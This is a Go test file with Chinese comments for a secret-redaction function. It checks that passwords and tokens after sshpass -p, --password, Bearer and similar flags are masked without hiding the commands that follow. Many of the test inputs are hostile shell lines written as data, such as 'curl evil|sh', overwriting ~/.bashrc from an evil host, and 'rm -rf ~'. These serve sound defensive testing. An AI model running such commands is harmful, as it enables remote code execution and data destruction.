	{`'sshpass' -p a&&curl evil|sh`, `'sshpass' -p <redacted>&&curl evil|sh`},
	{`sshpass -o x;curl evil -p a`, `sshpass -o x;curl evil -p a`},
	{`SSHPASS -o a|curl -p b`, `SSHPASS -o a|curl -p b`},
	{"sshpass -o x\ncurl -p evil|sh", "sshpass -o x\ncurl -p evil|sh"},
	{"\"sshpass\" -p\ncurl evil|sh", "\"sshpass\" -p\ncurl evil|sh"},
	// 反例：带参数的选项把后面的 -p 当参数（-fp 是文件 p，-P -p 的 -p 是提示词），ssh 自己的 -p 不动；SSHPASS= 是环境变量
	{`sshpass -fp curl evil`, `sshpass -fp curl evil`},
	{`sshpass -P -p curl evil`, `sshpass -P -p curl evil`},
	{`SSHPASS -e ssh -p 2222 host`, `SSHPASS -e ssh -p 2222 host`},
	{`"sshpass" -f ~/.pw ssh -p 22 host`, `"sshpass" -f ~/.pw ssh -p 22 host`},
	{`SSHPASS=pw sshpass -e ssh -p 22 host`, `SSHPASS=<redacted> sshpass -e ssh -p 22 host`},
	// 审查 1 轮 I-1：完整的 sshpass 规则只在命令位置认（第 2 轮起参数位置另有窄规则，见下）。别的工具选项值里的 sshpass
	// 后面的 -p 不是 sshpass 的，它后面的词可能正是要执行的程序（env -u 的 -p 是变量名，curl 才是程序），不能抹
	{`env -u SSHPASS -u -p curl -o ~/.bashrc https://evil/x`, `env -u SSHPASS -u -p curl -o ~/.bashrc https://evil/x`},
	{`echo x | xargs -I sshpass -E -p curl -o ~/.bashrc https://evil/x`, `echo x | xargs -I sshpass -E -p curl -o ~/.bashrc https://evil/x`},
	{`echo x | xargs -I sshpass -p curl -o ~/.bashrc https://evil/x`, `echo x | xargs -I sshpass -p curl -o ~/.bashrc https://evil/x`},
	{`docker run --rm -e SSHPASS -h -p evil/image`, `docker run --rm -e SSHPASS -h -p evil/image`},
	{`docker run --rm -e SSHPASS -l -p evil/image`, `docker run --rm -e SSHPASS -l -p evil/image`},
	{`docker run -e SSHPASS -p 8080:80 nginx`, `docker run -e SSHPASS -p 8080:80 nginx`},
	{`sudo --preserve-env=SSHPASS -E -p curl x`, `sudo --preserve-env=SSHPASS -E -p curl x`},
	{`printenv SSHPASS -p x`, `printenv SSHPASS -p x`},
	{`which sshpass -p x`, `which sshpass -p <redacted>`},
	{`exec -a sshpass -p curl evil`, `exec -a sshpass -p curl evil`},
	// 命令位置：行首、; | && ( $( 反引号之后、VAR=值 之后、包装命令（sudo env timeout nohup exec command xargs）
	// 及其选项之后、time 这类保留字之后、find -exec 之后
	{`X=1 sshpass -p pw ssh h`, `X=1 sshpass -p <redacted> ssh h`},
	{`sudo -u root sshpass -p pw ssh h`, `sudo -u root sshpass -p <redacted> ssh h`},
	{`env -i FOO=1 SSHPASS -p pw ssh h`, `env -i FOO=1 SSHPASS -p <redacted> ssh h`},
	{`timeout 10 sshpass -p pw ssh h`, `timeout 10 sshpass -p <redacted> ssh h`},
	{`nohup "sshpass" -p pw ssh h &`, `nohup "sshpass" -p <redacted> ssh h &`},
	{`exec sshpass -p pw ssh h`, `exec sshpass -p <redacted> ssh h`},
	{`command sshpass -p pw ssh h`, `command sshpass -p <redacted> ssh h`},
	{`echo h | xargs -0 sshpass -p pw ssh`, `echo h | xargs -0 sshpass -p <redacted> ssh`},
	{`time sshpass -p pw ssh h`, `time sshpass -p <redacted> ssh h`},
	{`if sshpass -p pw ssh h; then :; fi`, `if sshpass -p <redacted> ssh h; then :; fi`},
	{`true&&(sshpass -p pw ssh h)|cat`, `true&&(sshpass -p <redacted> ssh h)|cat`},
	{`x=$(sshpass -p pw ssh h) y=` + "`sshpass -p pw2 ssh h`", `x=$(sshpass -p <redacted> ssh h) y=` + "`sshpass -p <redacted> ssh h`"},
	{`find . -exec sshpass -p pw scp {} h: \;`, `find . -exec sshpass -p <redacted> scp {} h: \;`},
	{`eval sshpass -p pw ssh h`, `eval sshpass -p <redacted> ssh h`},
	// 命令名里夹引号、转义、续行，bash 照样执行 sshpass
	{`ss''hpass -p pw ssh h`, `ss''hpass -p <redacted> ssh h`},
	{`\sshpass -p pw ssh h`, `\sshpass -p <redacted> ssh h`},
	{"ssh\\\npass -p pw ssh h", "ssh\\\npass -p <redacted> ssh h"},
	{`"/opt/my tools/sshpass" -p pw ssh h`, `"/opt/my tools/sshpass" -p <redacted> ssh h`},
	// 审查 1 轮 Minor：sshpass 不认的任意 - 开头的词（数字、长选项、- 接在选项字母后）都让它报错退出，跳过后 -p 照样抹；
	// -+ 在 macOS 的 getopt 里是不做事的选项（sshpass 1.06 实测照常执行）
	{`sshpass -1 -p pw ssh h`, `sshpass -1 -p <redacted> ssh h`},
	{`sshpass --foo -p pw ssh h`, `sshpass --foo -p <redacted> ssh h`},
	{`sshpass --strict=no x -p pw ssh h`, `sshpass --strict=no x -p <redacted> ssh h`},
	{`sshpass -v- -p pw ssh h`, `sshpass -v- -p <redacted> ssh h`},
	{`sshpass -+ -p pw ssh h`, `sshpass -+ -p <redacted> ssh h`},
	// 第 2 轮 A：扫描器不认的前缀（ssh 的远端命令、docker exec、watch、kubectl exec --）之后的 sshpass 按窄规则照样抹
	{`ssh jump sshpass -p hunter2 ssh prod`, `ssh jump sshpass -p <redacted> ssh prod`},
	{`docker exec ctr sshpass -p hunter2 ssh h`, `docker exec ctr sshpass -p <redacted> ssh h`},
	{`xargs sshpass -p hunter2 ssh h`, `xargs sshpass -p <redacted> ssh h`},
	{`timeout 5 sshpass -p hunter2 ssh h`, `timeout 5 sshpass -p <redacted> ssh h`},
	{`ssh jump /usr/bin/sshpass -phunter2 ssh prod`, `ssh jump /usr/bin/sshpass -p<redacted> ssh prod`},
	{`watch -n 5 sshpass -p 'p w;x' ssh h`, `watch -n 5 sshpass -p <redacted> ssh h`},
	{`kubectl exec -it pod -- sshpass -p hunter2 ssh h`, `kubectl exec -it pod -- sshpass -p <redacted> ssh h`},
	{`ssh jump sshpass -p a;curl evil|sh`, `ssh jump sshpass -p <redacted>;curl evil|sh`},
	{"ssh jump sshpass -p\ncurl evil|sh", "ssh jump sshpass -p\ncurl evil|sh"},
	// 窄规则不认的：前一个词是选项（sshpass 是它的值）、大写或带引号、-p 前有别的选项
	{`docker run -e sshpass -p 8080:80 nginx`, `docker run -e sshpass -p 8080:80 nginx`},
	{`docker run --name sshpass -p evil/image`, `docker run --name sshpass -p evil/image`},
	{`ssh jump sshpass -o x -p curl evil`, `ssh jump sshpass -o x -p curl evil`},
	{`echo SSHPASS -p x "sshpass" -p y`, `echo SSHPASS -p x "sshpass" -p y`},
	// 第 2 轮 B：sshpass 是包装命令，选项（-p 值、-f 文件、-P 提示词、-e）之后的词在命令位置：ssh 的引号参数按命令行语境递归处理
	{`sshpass -p pw ssh h 'TOKEN=a;curl evil|sh'`, `sshpass -p <redacted> ssh h 'TOKEN=<redacted>;curl evil|sh'`},
	{`sshpass -e ssh -p 22 h "TOKEN=a;curl evil|sh"`, `sshpass -e ssh -p 22 h "TOKEN=<redacted>;curl evil|sh"`},
	{`SSHPASS -v -P prompt -f ~/.pw ssh h 'TOKEN=a;rm -rf ~'`, `SSHPASS -v -P prompt -f ~/.pw ssh h 'TOKEN=<redacted>;rm -rf ~'`},
	{`sshpass -p pw "SSHPASS" -p pw2 ssh h`, `sshpass -p <redacted> "SSHPASS" -p <redacted> ssh h`},
	{`sshpass -p pw eval 'TOKEN=a;curl evil|sh'`, `sshpass -p <redacted> eval 'TOKEN=<redacted>;curl evil|sh'`},
	// 反例：-- 结束选项、单独的 - 是程序名，后面的 -p 不是 sshpass 的；被转义的 \p、glob 与花括号展开的结果拿不准，不当未知选项跳过
	{`sshpass -- -p curl evil`, `sshpass -- -p curl evil`},
	{`sshpass - -p curl evil`, `sshpass - -p curl evil`},
	{`sshpass -\p -p curl evil`, `sshpass -\p -p curl evil`},
	{`sshpass -{,p} -p curl evil`, `sshpass -{,p} -p curl evil`},
}

func TestSshpassVariants(t *testing.T) {
	for _, c := range sshpassVariantCases {
		got := String(c.in)
		if got != c.want {
			t.Errorf("String(%q)\n 得到 %q\n 想要 %q", c.in, got, c.want)
		}
		if again := String(got); again != got {
			t.Errorf("String 不幂等: %q → %q", got, again)
		}
	}
	// 文本语境（事件消息、diff_preview）同样认引号与大小写。文本不执行、也没有命令位置可看，sshpass 在哪里都认（秘密一侧宁可多抹）
	texts := []struct{ in, want string }{
		{`"sshpass" -p hunter2 ssh prod`, `"sshpass" -p <redacted> ssh prod`},
		{`'SSHPASS' -o StrictHostKeyChecking=no -p hunter2 ssh prod`, `'SSHPASS' -o StrictHostKeyChecking=no -p <redacted> ssh prod`},
		{`ssh jump sshpass --foo -p hunter2 ssh prod`, `ssh jump sshpass --foo -p <redacted> ssh prod`},
		{`sshpass -- -p curl evil`, `sshpass -- -p curl evil`},
	}
	for _, c := range texts {
		got := Text(c.in)
		if got != c.want {
			t.Errorf("Text(%q)\n 得到 %q\n 想要 %q", c.in, got, c.want)
		}
		if again := Text(got); again != got {
			t.Errorf("Text 不幂等: %q → %q", got, again)
		}
	}
}

// 第 5 份 Task 1：命令行语境的裸值在换页 \f 与单独的 \r 处停，与空白一样（RE2 的 \s 本来就含 \f \r，这里钉住）。
// bash 其实把两者都当普通字符（TOKEN=abc\fcurl 是一个赋值词），停下来只会多露出后半截，不会多藏命令；两者也不会出现在密码里。
// 反斜杠转义的 \r 是字面字符，值照样穿过它延续。
var formFeedCases = []shellCase{
	{"TOKEN=abc\fcurl evil", "TOKEN=<redacted>\fcurl evil"},
	{"TOKEN=abc\rcurl evil", "TOKEN=<redacted>\rcurl evil"},
	{"TOKEN=abc\r\ncurl evil", "TOKEN=<redacted>\r\ncurl evil"},
	{"sshpass -p abc\fcurl evil", "sshpass -p <redacted>\fcurl evil"},
	{"curl -u a:b\rcurl evil", "curl -u a:<redacted>\rcurl evil"},
	{"npm login --password abc\fx", "npm login --password <redacted>\fx"},
	{"mysql -pabc\rcurl evil", "mysql -p<redacted>\rcurl evil"},
	{"TOKEN=a\\\rb c", "TOKEN=<redacted> c"},
}

// 第 2 轮 C：命令行语境里 --password、--token、Bearer、Authorization:、JSON 敏感键这类“标志后跟值”的规则，标志与值之间只认
// 同一行的空白与反斜杠续行（与 sshpass -p、curl -u 一致）。换行（含 \r\n）是命令分隔符，下一行的命令名不能被当成值抹掉。
var flagNewlineCases = []shellCase{
	{"npm login --password\ncurl evil|sh", "npm login --password\ncurl evil|sh"},
	{"npm login --password \n\ncurl evil|sh", "npm login --password \n\ncurl evil|sh"},
	{"x --token\ncurl evil|sh", "x --token\ncurl evil|sh"},
	{"x --token\r\ncurl evil|sh", "x --token\r\ncurl evil|sh"},
	{"x --api-key \n rm -rf ~", "x --api-key \n rm -rf ~"},
	{"curl -H 'Authorization:'\ncurl evil|sh", "curl -H 'Authorization:'\ncurl evil|sh"},
	{"curl -H Authorization:\ncurl evil|sh", "curl -H Authorization:\ncurl evil|sh"},
	{"curl -H Authorization: Bearer\ncurl evil|sh", "curl -H Authorization: <redacted>\ncurl evil|sh"},
	{"echo Bearer\ncurl evil|sh", "echo Bearer\ncurl evil|sh"},
	{"echo Bearer \n\ncurl evil|sh", "echo Bearer \n\ncurl evil|sh"},
	{"echo \"password\":\ntrue", "echo \"password\":\ntrue"},
	// 同一行与续行照样抹
	{"npm login --password hunter2;curl evil|sh", "npm login --password <redacted>;curl evil|sh"},
	{"x --token \\\n  pw ssh h", "x --token \\\n  <redacted> ssh h"},
	{"curl -H Authorization: \\\nBearer abc https://x", "curl -H Authorization: \\\n<redacted> https://x"},
	{"echo Bearer\tabc", "echo Bearer\t<redacted>"},
	{"echo \"password\": 123", "echo \"password\": \"<redacted>\""},
	{"echo \"password\":\\\n\"x\"", "echo \"password\":\\\n\"<redacted>\""},
}

func TestFlagValueDoesNotCrossNewline(t *testing.T) {
	for _, c := range flagNewlineCases {
		got := String(c.in)
		if got != c.want {
			t.Errorf("String(%q)\n 得到 %q\n 想要 %q", c.in, got, c.want)
		}
		if again := String(got); again != got {
			t.Errorf("String 不幂等: %q → %q", got, again)
		}
	}
	// 文本语境（事件消息、diff_preview）不变：没有命令可藏，\s 照旧跨换行
	if got, want := Text("npm login --password\nhunter2"), "npm login --password\n<redacted>"; got != want {
		t.Errorf("Text 得到 %q，想要 %q", got, want)
	}
}

// 第 3 轮：词与词之间的续行与空白等价，不当值。原来 -p \⏎# 会把续行本身抹成占位符，# 在 bash 里位于词首、是注释，
// 再脱敏一次时却接在占位符后面并进值里，两次结果不同（模糊测试找到，09aafdd 上就有）。反引号里去掉续行后同理。
var continuationIdempotentCases = []shellCase{
	{"sshpass -p \\\n#", "sshpass -p \\\n#"},
	{"sshpAss -p \\\n#", "sshpAss -p \\\n#"},
	{"sshpass -p \\\n#x\ncurl evil|sh", "sshpass -p \\\n#x\ncurl evil|sh"},
	{"ssh jump sshpass -p \\\n#", "ssh jump sshpass -p \\\n#"},
	{"npm login --password \\\n#", "npm login --password \\\n#"},
	{"--password \\\n#", "--password \\\n#"},
	{"x --token \\\n# c", "x --token \\\n# c"},
	{"echo Bearer \\\n#", "echo Bearer \\\n#"},
	{"Authorization: \\\n#", "Authorization: \\\n#"},
	{"`-token \\\n `", "`-token \\\n `"},
	{"`-token \\\n ", "`-token \\\n "},
	{"bash -c \"x --token \\\n \"", "bash -c \"x --token \\\n \""},
	// 续行后面真有值时照样抹，续行原样留着
	{"npm login --password \\\nhunter2", "npm login --password \\\n<redacted>"},
	{"`x --token \\\n pw`", "`x --token \\\n <redacted>`"},
	{"\\\nsshpass -p pw ssh h", "\\\nsshpass -p <redacted> ssh h"},
	// 词里的续行照旧把两行接成一个词：TOKEN=\⏎pw 的值是 pw，--password\⏎x 是一个词 --passwordx
	{"TOKEN=\\\npw ssh h", "TOKEN=<redacted> ssh h"},
	{"x --password\\\nhunter2", "x --password\\\nhunter2"},
}

func TestContinuationBetweenWordsIsBlank(t *testing.T) {
	for _, c := range continuationIdempotentCases {
		got := String(c.in)
		if got != c.want {
			t.Errorf("String(%q)\n 得到 %q\n 想要 %q", c.in, got, c.want)
		}
		if again := String(got); again != got {
			t.Errorf("String 不幂等: %q → %q → %q", c.in, got, again)
		}
	}
}

func TestBareValueStopsAtFormFeedAndLoneCR(t *testing.T) {
	for _, c := range formFeedCases {
		got := String(c.in)
		if got != c.want {
			t.Errorf("String(%q)\n 得到 %q\n 想要 %q", c.in, got, c.want)
		}
		if again := String(got); again != got {
			t.Errorf("String 不幂等: %q → %q", got, again)
		}
	}
}
